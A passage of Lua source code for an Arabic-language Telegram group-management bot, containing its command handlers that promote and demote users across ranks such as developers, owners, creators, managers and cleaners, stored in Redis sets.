HMDicconstructor = 'المنشئين الاساسيين • ' else HMDicconstructor = '' end
if DevHmD:sismember(DevTwix..'HmD:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevHmD:sismember(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevHmD:sismember(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevHmD:sismember(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevHmD:sismember(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من » \n~ ( "..HmDsudo..secondsudo..sudobot..HMDicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","⋄︙لم تتم ترقيته مسبقا")  
end 
if HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevHmD:srem(DevTwix..'HmD:HmDSudo:', result.id_)
DevHmD:srem(DevTwix..'HmD:SecondSudo:', result.id_)
DevHmD:srem(DevTwix..'HmD:SudoBot:', result.id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'HmDsudo' then
DevHmD:srem(DevTwix..'HmD:SecondSudo:', result.id_)
DevHmD:srem(DevTwix..'HmD:SudoBot:', result.id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevHmD:srem(DevTwix..'HmD:SudoBot:', result.id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'HmDconstructor' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'HMDicconstructor' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
---------------------------------------------------------------------------------------
--     Set HmDSudo     --
if Sudo(msg) then
if text ==('اضف مطور اساسي') or text ==('رفع مطور اساسي') and ChTwixDev(msg) then
function sudo_reply(extra, result, success)
DevHmD:sadd(DevTwix..'HmD:HmDSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المطورين الاساسيين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطور اساسي @(.*)')) and ChTwixDev(msg) then
local username = text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطور اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:HmDSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المطورين الاساسيين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور اساسي (%d+)') or text:match('^رفع مطور اساسي (%d+)')) and ChTwixDev(msg) then
local user = text:match('اضف مطور اساسي (%d+)') or text:match('رفع مطور اساسي (%d+)')
DevHmD:sadd(DevTwix..'HmD:HmDSudo:',user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المطورين الاساسيين")  
end
---------------------------------------------------------------------------------------
--     Rem SecondSudo     --
if text ==('حذف مطور اساسي') or text ==('تنزيل مطور اساسي') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:HmDSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المطورين الاساسيين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور اساسي @(.*)') or text:match('^تنزيل مطور اساسي @(.*)')) and ChTwixDev(msg) then
local username = text:match('^حذف مطور اساسي @(.*)') or text:match('^تنزيل مطور اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:HmDSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المطورين الاساسيين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور اساسي (%d+)') or text:match('^تنزيل مطور اساسي (%d+)')) and ChTwixDev(msg) then
local user = text:match('حذف مطور اساسي (%d+)') or text:match('تنزيل مطور اساسي (%d+)')
DevHmD:srem(DevTwix..'HmD:HmDSudo:',user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المطورين الاساسيين")  
end end
---------------------------------------------------------------------------------------
--     Set SecondSudo     --
if HmDSudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and ChTwixDev(msg) then
function sudo_reply(extra, result, success)
DevHmD:sadd(DevTwix..'HmD:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')) and ChTwixDev(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المطورين الثانويين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and ChTwixDev(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
DevHmD:sadd(DevTwix..'HmD:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المطورين الثانويين")  
end
---------------------------------------------------------------------------------------
--     Rem SecondSudo     --
if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')) and ChTwixDev(msg) then
local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المطورين الثانويين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and ChTwixDev(msg) then
local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
DevHmD:srem(DevTwix..'HmD:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المطورين الثانويين")  
end end
---------------------------------------------------------------------------------------
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطور') and ChTwixDev(msg) then
function sudo_reply(extra, result, success)
DevHmD:sadd(DevTwix..'HmD:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')) and ChTwixDev(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المطورين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and ChTwixDev(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
DevHmD:sadd(DevTwix..'HmD:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المطورين")  
end
---------------------------------------------------------------------------------------
--       Rem SudoBot      --
if text ==('حذف مطور') or text ==('تنزيل مطور') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')) and ChTwixDev(msg) then
local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المطورين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and ChTwixDev(msg) then
local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
DevHmD:srem(DevTwix..'HmD:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المطورين")  
end end
---------------------------------------------------------------------------------------
--   Set HmDConstructor   --
if ChatType == 'sp' or ChatType == 'gp'  then
if SudoBot(msg) then
if text ==('رفع مالك') and ChTwixDev(msg) then
function raf_reply(extra, result, success)
DevHmD:sadd(DevTwix..'HmD:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه مالك")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مالك @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه مالك")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مالك (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع مالك (%d+)')
DevHmD:sadd(DevTwix..'HmD:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه مالك")  
end
---------------------------------------------------------------------------------------
--   Rem HmDConstructor   --
if text ==('تنزيل مالك') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevHmD:srem(DevTwix..'HmD:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من المالكين")  
end end end
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
if text and text:match('^تنزيل مالك @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevHmD:srem(DevTwix..'HmD:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من المالكين")  
end end end
end,nil)
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مالك (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل مالك (%d+)')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(user) == tonumber(admins[i].user_id_) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevHmD:srem(DevTwix..'HmD:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من المالكين")  
end end end
end,nil)
end end
---------------------------------------------------------------------------------------
--  Set HMDicConstructor  --
if Owner(msg) then
if text ==('رفع منشئ اساسي') and ChTwixDev(msg) then
function raf_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه منشئ اساسي")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه منشئ اساسي")  
end
---------------------------------------------------------------------------------------
--  Rem HMDicConstructor  --
if text ==('تنزيل منشئ اساسي') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله منشئ اساسي")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not Owner(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙هذا الامر للمالكين والمطورين فقط', 1, 'md')
end
---------------------------------------------------------------------------------------
--    Set  Constructor    --
if HMDicConstructor(msg) then
if text ==('رفع منشئ') and ChTwixDev(msg) then
function raf_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المنشئين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع منشئ (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المنشئين")  
end
---------------------------------------------------------------------------------------
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المنشئين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المنشئين")  
end 
end
---------------------------------------------------------------------------------------
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المدراء")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع مدير (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المدراء")  
end
---------------------------------------------------------------------------------------
--       Rem Manager      --
if text ==('تنزيل مدير') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المدراء")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المدراء")  
end 
---------------------------------------------------------------------------------------
--       Set Cleaner      --
if text ==('رفع منظف') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
